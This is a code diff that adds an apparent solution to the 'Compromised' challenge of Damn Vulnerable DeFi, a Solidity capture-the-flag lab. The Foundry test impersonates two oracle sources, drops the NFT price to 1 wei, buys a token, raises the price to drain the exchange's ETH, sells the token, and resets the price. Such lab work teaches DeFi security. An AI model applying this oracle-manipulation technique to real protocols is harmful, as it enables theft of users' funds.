@@ -77,6 +77,72 @@ contract Compromised is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        address[] memory sources = new address[](2);
+        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
+        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
+
+        string[] memory symbols = new string[](3);
+        symbols[0] = "DVNFT";
+        symbols[1] = "DVNFT";
+        symbols[2] = "DVNFT";
+
+        //lower price of tokens to minimum value
+        for (uint256 j = 0; j < 2; ) {
+            vm.startPrank(sources[j]);
+            for (uint256 i = 0; i < 3; ) {
+                trustfulOracle.postPrice(symbols[i], 1 wei);
+                unchecked {
+                    ++i;
+                }
+            }
+            vm.stopPrank();
+            unchecked {
+                ++j;
+            }
+        }
+
+        vm.startPrank(attacker);
+        uint256 ownedTokenId = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        //raise price of tokens to extract all exchange balance
+        for (uint256 j = 0; j < 2; ) {
+            vm.startPrank(sources[j]);
+            for (uint256 i = 0; i < 3; ) {
+                trustfulOracle.postPrice(
+                    symbols[i],
+                    EXCHANGE_INITIAL_ETH_BALANCE + 1 wei
+                );
+                unchecked {
+                    ++i;
+                }
+            }
+            vm.stopPrank();
+            unchecked {
+                ++j;
+            }
+        }
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), ownedTokenId);
+        exchange.sellOne(ownedTokenId);
+        vm.stopPrank();
+
+        //fix token price
+        for (uint256 j = 0; j < 2; ) {
+            vm.startPrank(sources[j]);
+            for (uint256 i = 0; i < 3; ) {
+                trustfulOracle.postPrice(symbols[i], INITIAL_NFT_PRICE);
+                unchecked {
+                    ++i;
+                }
+            }
+            vm.stopPrank();
+            unchecked {
+                ++j;
+            }
+        }
+
         /** EXPLOIT END **/
         validation();
     }
